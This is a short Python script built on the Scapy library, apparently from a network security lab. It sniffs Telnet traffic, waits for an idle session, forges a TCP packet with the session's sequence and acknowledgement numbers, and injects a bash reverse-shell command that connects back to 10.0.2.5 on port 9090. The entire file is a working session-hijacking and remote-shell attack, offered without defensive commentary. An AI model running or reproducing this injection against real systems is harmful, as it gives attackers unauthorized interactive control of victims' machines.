#!/usr/bin/python

from scapy.all import *

# remove duplication
# {"dest ip":times}
dest_record = {}


def do_hijack(pkt):
    key = pkt[IP].dst
    if key not in dest_record:     # freshman
        dest_record[key] = 0
        return
    else:
        if dest_record[key] < 0:   # prior victim
            return
        if dest_record[key] <= 50: # wait for logging
            dest_record[key] += 1
            # print(dest_record[key])
            return
        if 4*pkt[IP].ihl+4*pkt[TCP].dataofs != pkt[IP].len:  # exist content
            # print(pkt[IP].ihl, pkt[TCP].dataofs, pkt[IP].len)
            return
        else:
            dest_record[key] = -1   # attack

    ip = IP(id=pkt[IP].id+1, src=pkt[IP].src, dst=pkt[IP].dst)
    tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport,
              seq=pkt[TCP].seq, ack=pkt[TCP].ack, flags=0x18)
    raw = Raw(load='\r\n/bin/bash -i > /dev/tcp/10.0.2.5/9090 0<&1 2>&1\r\n')
    pkt = ip/tcp/raw
    # ls(pkt)
    send(pkt, verbose=0)
    print('attacked', key)


pkt = sniff(filter='dst port 23', prn=do_hijack)
